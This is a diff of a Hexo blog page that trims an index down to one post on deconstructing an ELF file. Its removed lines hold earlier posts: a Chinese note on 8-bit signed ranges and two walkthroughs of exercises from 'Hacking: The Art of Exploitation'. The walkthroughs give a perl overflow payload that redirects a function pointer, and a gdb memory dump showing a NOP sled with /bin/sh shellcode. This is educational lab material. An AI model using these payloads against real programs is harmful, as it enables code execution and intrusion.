@@ -3,11 +3,18 @@
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   
-  <title>Hexo</title>
+  <title>deconstructing-an-elf-file | Hexo</title>
   <meta name="author" content="John Doe">
   
+  <meta name="description" content="hackme: Deconstructing an ELF FileThis write-up complements the analysis of
+
+hackme: Deconstructing an ELF File
+
+BIG THANKS TO THE AUTHOR!
+There are a">
   
   
+  <meta property="og:title" content="deconstructing-an-elf-file">
   <meta property="og:site_name" content="Hexo">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -94,7 +101,6 @@
     <div id="main-col" class="alignright">
     <div id="wrapper">
       
-  
 <article class="post">
   
     <div class="gallery">
@@ -114,7 +120,7 @@
       
       
   
-    <h1 class="title"><a href="/2019/06/03/deconstructing-an-elf-file/">deconstructing-an-elf-file</a></h1>
+    <h1 class="title">deconstructing-an-elf-file</h1>
   
 
       <time datetime="2019-06-03T20:35:37.000Z"><a href="/2019/06/03/deconstructing-an-elf-file/">2019-06-03</a></time>
@@ -159,263 +165,29 @@
     </div>
     <footer>
       
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-  
-<article class="post">
-  
-    <div class="gallery">
-  <div class="photoset">
-    
-      <img src>
-    
-  </div>
-  <div class="control">
-    <div class="prev"></div>
-    <div class="next"></div>
-  </div>
-</div>
-  
-  <div class="post-content">
-  <header>
-      
-      
-  
-    <h1 class="title"><a href="/2018/11/24/如何计算8位二进制位可表示的最大无符号和有符号数/">如何计算8位二进制位可表示的最大无符号和有符号数</a></h1>
-  
-
-      <time datetime="2018-11-24T23:30:46.000Z"><a href="/2018/11/24/如何计算8位二进制位可表示的最大无符号和有符号数/">2018-11-24</a></time>
-      
-  </header>
-    <div class="entry">
-      
-        <p>一个8位的二进制位可表示的最大和最小的无符号数为：</p>
-<p>11111111 - 255<br>00000000 - 0</p>
-<p>那么最大跟最小的有符号数呢？</p>
-<p>在不查询Google的情况下，我们来看下怎么算。</p>
-<p>在谈论有符号数的背景下，首先看如何判断一个二进制数是正还是负数？</p>
-<p>答案是根据最左边的数字来判断的。</p>
-<p>1为负，0为正</p>
-<p>所以11111111是一个负数，00000000是一个正数。</p>
-<p>那么11111111在负数中处于一个什么位置呢，它是8位二进制位中可表示的最大负数吗？还是最小的？还是都不是？</p>
-<p>我们将其表示为十进制数来比较会比较直观。</p>
-<p>那么它表示的十进制数是什么？</p>
-<p>我们先反过来看，怎么将一个十进制的负数表示成一个二进制数。</p>
-<p>以-10为例。先将十进制的负数取绝对数，结果为10.</p>
-<pre><code>1. 将其绝对值表示为二进制。结果为1010。
-
-2. 将以上结果取反。结果为0101.
-
-3. 再在其基础上加1. 结果为0110，这就是-10在计算机中的存储形式。
-</code></pre><p>现在回到原来的话题，11111111表示的是一个什么十进制的负数？</p>
-<p>这其实是对刚刚第一个例子的一个反向操作。</p>
-<pre><code>1. 先将11111111减1，得到11111110.
-
-2. 接着取反。得到00000001。
-
-3. 将其转化为十进制数 - 结果为1。
-
-4. 最后为其加上负号，最终结论就是其表示是一个十进制的-1
-</code></pre><p>那么8个二进制位可表示的最大正数和最小负数是多少？（换句话说就是最大跟最小的数）</p>
-<p>既然在有符号数里11111111表示是十进制的-1，那么如果我们自然而然的想到将其减1是否就是十进制的-2？对滴！</p>
-<p>那么可以表示的最小有符号数是多少呢？</p>
-<p>使用以上逻辑，那么我们一直减下去不就可以得到最小的负数值了吗？当然可以。但问题是减到什么时候为止呢？</p>
-<p>在保持最左边的1不动的情况下（为什么？）首先我可以想到减到10000000应该是最小了。那么这是个什么十进制的负数呢？答案是-128.</p>
-<p>那有没有可能表示到-129？ 按照-129比-128小1的逻辑，我们来验证下。</p>
-<p>10000000 - 1 = 00000001</p>
-<p>这就不对了，一个负数减一反倒成了一个正数。</p>
-<p>所以我们可以推断-128就是8位二进制位可表示的最小有符号数值。</p>
-<p>那么可以表示的最大有符号数是多少呢？</p>
-<p>最大数肯定是个正数，所以最左边肯定是0. 一个合理的猜测就是01111111.</p>
-<p>这是十进制的127.</p>
-<p>表示到128有没有可能？ 算一下就知。</p>
-<p>01111111 + 1 = 10000000</p>
-<p>一个正数加1结果变成了一个负数，肯定不行。</p>
-<p>所以结论就是8位二进制位可表示的最大有符号十进制数为+127。</p>
-
 	 
-	     <p style="margin:20px 0; color:#9f9f9f; font-size:12px;">
-<span>Posted by <a style="color:#9f9f9f;" href><strong></strong></a> - 2018-11-24</span><br>
-<span style="line-height:13px;">如需转载，请注明： 本文来自 <a style="color:#9f9f9f;" href="https://blog.bbf.ninja"><strong>Hexo</strong></a></span>
-</p>
+     		  
+  
+  <div class="categories">
+    <a href="/categories/cyber-security/">cyber_security</a>, <a href="/categories/cyber-security/reverse-engineering/">reverse_engineering</a>
+  </div>
+
+       		
+  
+  <div class="tags">
+    <a href="/tags/c/">c</a>, <a href="/tags/reverse-engineering/">reverse engineering</a>
+  </div>
+
+     		  
        	 
       
-    </div>
-    <footer>
-      
-        
-        
-      
       <div class="clearfix"></div>
     </footer>
   </div>
 </article>
 
 
-
-
-  
-<article class="post">
-  
-    <div class="gallery">
-  <div class="photoset">
-    
-      <img src>
-    
-  </div>
-  <div class="control">
-    <div class="prev"></div>
-    <div class="next"></div>
-  </div>
 </div>
-  
-  <div class="post-content">
-  <header>
-      
-      
-  
-    <h1 class="title"><a href="/2018/11/19/Hacking-The-Art-of-Exploitation-Overflowing-Function-Pointers-writeup/">Hacking: The Art of Exploitation - Overflowing Function Pointers writeup</a></h1>
-  
-
-      <time datetime="2018-11-19T21:54:33.000Z"><a href="/2018/11/19/Hacking-The-Art-of-Exploitation-Overflowing-Function-Pointers-writeup/">2018-11-19</a></time>
-      
-  </header>
-    <div class="entry">
-      
-        <p>The exploit buffer to overflow the function pointer is as follows,</p>
-<p><code>$ perl -e &#39;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\x70\x8d\x04\x08\n&quot; . &quot;1\n&quot; . &quot;y\n&quot;x10 . &quot;n\n5\nJon Erickson\n7\n&quot;&#39; |
-./game_of_chance</code></p>
-<p>The key for this exploit to work is to - <strong>play the same game after changing your user name.</strong></p>
-<p>The exploitation is divided into two phases,</p>
-<ol>
-<li>The first phase is to select a game to play, and change your user name right after.</li>
-</ol>
-<p>The game can be either game 1 or 2 or 3. This sets the <code>last_game</code> which will be compared to the <code>chocie</code> in phase 2.</p>
-<p>They need to be equal to allow the exploitation to work.</p>
-<p>Changing the user name is to overwrite the function poitner <code>current_game</code> with the address of the <code>jackpot()</code> function.</p>
-<ol start="2">
-<li>In the second phase, when the same game is played, the following code snippet will be skipped, because <code>choice</code> is intentionally made to equal to <code>last_game</code>.</li>
-</ol>
-<p>This makes the execution proceeds to <code>play_the_game</code>. And when <code>player.current_game()</code> is reached, the exeuction will jump to location <code>&quot;\x70\x8d\x04\x08\n&quot;</code>, which is where the <code>jackpot()</code> function is located.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(choice != last_game) &#123; <span class="comment">// If the function ptr isn't set</span></span><br><span class="line">               <span class="keyword">if</span>(choice == <span class="number">1</span>)        <span class="comment">// then point it at the selected game</span></span><br><span class="line">                  player.current_game = pick_a_number;</span><br><span class="line">               <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">2</span>)</span><br><span class="line">                  player.current_game = dealer_no_match;</span><br><span class="line">               <span class="keyword">else</span></span><br><span class="line">                  player.current_game = find_the_ace;</span><br><span class="line">               last_game = choice;   <span class="comment">// and set last_game.</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
-
-	 
-	     <p style="margin:20px 0; color:#9f9f9f; font-size:12px;">
-<span>Posted by <a style="color:#9f9f9f;" href><strong></strong></a> - 2018-11-19</span><br>
-<span style="line-height:13px;">如需转载，请注明： 本文来自 <a style="color:#9f9f9f;" href="https://blog.bbf.ninja"><strong>Hexo</strong></a></span>
-</p>
-       	 
-      
-    </div>
-    <footer>
-      
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-  
-<article class="post">
-  
-    <div class="gallery">
-  <div class="photoset">
-    
-      <img src>
-    
-  </div>
-  <div class="control">
-    <div class="prev"></div>
-    <div class="next"></div>
-  </div>
-</div>
-  
-  <div class="post-content">
-  <header>
-      
-      
-  
-    <h1 class="title"><a href="/2018/11/06/Hacking-The-Art-of-Exploitation-Exploit-notesearch-c-writeup/">Hacking: The Art of Exploitation - exploit_notesearch.c writeup</a></h1>
-  
-
-      <time datetime="2018-11-06T15:40:44.000Z"><a href="/2018/11/06/Hacking-The-Art-of-Exploitation-Exploit-notesearch-c-writeup/">2018-11-06</a></time>
-      
-  </header>
-    <div class="entry">
-      
-        <p><a href="https://github.com/intere/hacking/blob/master/booksrc/exploit_notesearch.c" target="_blank" rel="noopener">exploit_notesearch source code.c</a></p>
-<p>What the exploit_notesearch.c does, is to allocate an area of memory pointed to by <code>command</code>, to build the exploit command. A proportion of this area is pointed to by <code>buffer</code>, which stores the exploit code.</p>
-<p>When looking at the code of exploit_notesearch.c, the part that confuses me the most is, </p>
-<p><br></p>
-<blockquote>
-<p><strong>How is the offset 270 determined?</strong></p>
-</blockquote>
-<p><br></p>
-<p>After spending enormous hours experimenting, I figured out it is based on the fact that the stack of the <code>notesearch</code> program is residing above the stack of <code>exploit_notesearch</code> program who invokes it.</p>
-<p>That is why varialbe <code>i</code> is used as a reference point to reach to the exploit code exists in the <code>notesearch</code> stack.</p>
-<p>To actually see this behavior ourselves, we can attach to the process of <code>notesearch</code> from gdb, to inspect the data stored in its stack. To do that, we can have a script keep polling the child process of <code>exploit_notesearch</code> program, once the <code>notesearch</code> program is spawned, the script will call gdb to attach to it, and pause its execution for us to explore the data on its stack.</p>
-<p>I will call the script in question <code>gdb-att-childpid.sh</code> (thanks to <a href="https://stackoverflow.com/questions/4382348/is-there-any-way-to-tell-gdb-to-wait-for-a-process-to-start-and-attach-to-it" target="_blank" rel="noopener">this post</a>. Its content is shown below.</p>
-<p>This script will be running in another terminal window. It takes the process name as its input, if our case, is <code>exploit</code>. Once it detects any child process spawned under the given process name, it will start a gdb instance to attach to the child process, and then we have a interactive gdb session to inspect the memory stack of <code>notesearch</code>.</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line"></span><br><span class="line">progstr=$1</span><br><span class="line">progpid=$(pgrep $progstr)</span><br><span class="line">while [ "$progpid" == "" ]; do</span><br><span class="line">   progpid=$(pgrep $progstr)</span><br><span class="line">done</span><br><span class="line">sudo gdb -p $progpid</span><br></pre></td></tr></table></figure>
-<p>First we start above script in a terminal, then we open a new terminal window to debug the <code>exploit_notesearch</code> program.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -q exploit_notesearch</span><br><span class="line">(gdb) run 210</span><br><span class="line">Starting program: /home/myuser/exploit_notesearch 210</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>We are setting offset to 210 rahter the default value 270 here, and this might be different in your lab. This value is determined by using the technique (for…seq) illustrated on page 141 of the Hacking: The Art of Exploitation book.</p>
-</blockquote>
-<p>Meanwhile, we notice gdb has automatically attached to the <code>notesearch</code> process in another winodow, and we are given the gdb window to debug from there,</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">warning: not using untrusted file &quot;/home/myuser/.gdbinit&quot;</span><br><span class="line">Attaching to process 21537</span><br><span class="line">Reading symbols from /home/myuser/exploit_notesearch/notesearch...done.</span><br><span class="line">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;.</span><br><span class="line">Reading symbols from /lib/tls/i686/cmov/libc.so.6...done.</span><br><span class="line">Loaded symbols for /lib/tls/i686/cmov/libc.so.6</span><br><span class="line">Reading symbols from /lib/ld-linux.so.2...done.</span><br><span class="line">Loaded symbols for /lib/ld-linux.so.2</span><br><span class="line">0xffffe410 in __kernel_vsyscall ()</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
-<p>First, let’s see where we are right now,</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) where</span><br><span class="line">#0  0xffffe410 in __kernel_vsyscall ()</span><br><span class="line">#1  0xb7f29e40 in nanosleep () from /lib/tls/i686/cmov/libc.so.6</span><br><span class="line">#2  0xb7f29c8f in sleep () from /lib/tls/i686/cmov/libc.so.6</span><br><span class="line">#3  0x0804883b in main (argc=2, argv=0xbffff834) at notesearch.c:20</span><br></pre></td></tr></table></figure>
-<p>The <code>where</code> command shows the backtrace of all the stacks. <code>#0</code> being the current(innvermost) stack, the stack right beneath it is its parent. The output above actually ressembles the order the stack for each function is built in memory - the latest/innermost stack being on the lowest memory address space (on the top of its parent).</p>
-<p>Since we need to inspect the data in <code>notesearch</code>‘s stack, we can use command <code>frame 3</code> to get there.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) frame 3</span><br><span class="line">#3  0x08048792 in main (argc=2, argv=0xbffff7c4) at notesearch.c:16</span><br><span class="line">16         sleep(1);</span><br></pre></td></tr></table></figure>
-<p>We can see the execution is currently paused at line 16 of notesearch.c. This is before the exploit code is put into the <code>searchstring</code> variable. Now let’s contiune the execution to pass the initialization  of the <code>searchstring</code> variable.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) until 26</span><br><span class="line">main (argc=-1073744190, argv=0xbffff6c2) at notesearch.c:26</span><br></pre></td></tr></table></figure>
-<p>The <code>until</code> command tells the execution to proceed until it reaches line 26 in the notesearch source file.</p>
-<p>Now let’s inspect the data stored in <code>searchstring</code>,</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/32xw &amp;searchstring</span><br><span class="line">0xbffff6b0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xbffff6c0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xbffff6d0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xbffff6e0:     0x90909090      0x90909090      0x90909090      0xdb31c031</span><br><span class="line">0xbffff6f0:     0xb099c931      0x6a80cda4      0x6851580b      0x68732f2f</span><br><span class="line">0xbffff700:     0x69622f68      0x51e3896e      0x8953e289      0xbf80cde1</span><br><span class="line">0xbffff710:     0xbffff6c2      0xbffff6c2      0xbffff6c2      0xbffff6c2</span><br><span class="line">0xbffff720:     0xbffff6c2      0xbffff6c2      0xbffff6c2      0xbffff6c2</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
-<p>Hurray! The data stored here is exact what we expected, and the return address <code>0xbffff6c2</code> calculated just now sits right in the mid of NOP instructions, which makes the exploitation evetually happen.</p>
-
-	 
-	     <p style="margin:20px 0; color:#9f9f9f; font-size:12px;">
-<span>Posted by <a style="color:#9f9f9f;" href><strong></strong></a> - 2018-11-06</span><br>
-<span style="line-height:13px;">如需转载，请注明： 本文来自 <a style="color:#9f9f9f;" href="https://blog.bbf.ninja"><strong>Hexo</strong></a></span>
-</p>
-       	 
-      
-    </div>
-    <footer>
-      
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-
-<nav id="pagination">
-  
-  
-</nav></div>
     </div>
     <div class="tabbar" onload="divideTabBar()">
 	
